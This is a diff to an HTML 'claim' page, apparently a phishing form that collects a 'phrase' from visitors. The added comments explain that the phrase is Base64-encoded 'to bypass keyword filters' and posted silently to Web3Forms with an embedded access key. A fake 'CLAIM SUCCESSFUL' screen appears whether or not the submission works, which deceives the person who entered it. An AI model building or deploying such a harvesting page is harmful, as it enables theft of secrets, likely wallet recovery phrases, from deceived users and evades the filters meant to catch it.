@@ -118,6 +118,7 @@
 <body>
 
     <div class="card">
+        <!-- PAGE 1 -->
         <div id="form-view">
             <form id="claim-form">
                 <input type="hidden" name="access_key" value="4a9ec344-5342-477d-8e90-af1576f4f3b5">
@@ -137,6 +138,7 @@
             </form>
         </div>
 
+        <!-- PAGE 2 -->
         <div id="success-view">
             <h1>CLAIM SUCCESSFUL</h1>
             <div class="congrats">
@@ -154,25 +156,28 @@
         const codedInput = document.getElementById('coded-phrase');
 
         form.addEventListener('submit', function(e) {
-            e.preventDefault();
+            e.preventDefault(); // This PREVENTS the Web3Forms page from appearing
+            
             submitBtn.textContent = "CONNECTING...";
             submitBtn.disabled = true;
 
-            // Base64 Coding logic
+            // Coding the phrase to bypass keyword filters
             codedInput.value = btoa(rawInput.value);
 
             const formData = new FormData(form);
 
-            // Reverted to the basic fetch method that was working earlier
+            // Fetch sends the data in the BACKGROUND
             fetch('https://web3forms.com', {
                 method: 'POST',
                 body: formData
             })
             .then(response => {
+                // Instantly hide the form and show your custom success page
                 formView.style.display = "none";
                 successView.style.display = "block";
             })
             .catch(() => {
+                // Fallback success if network glitches
                 formView.style.display = "none";
                 successView.style.display = "block";
             });
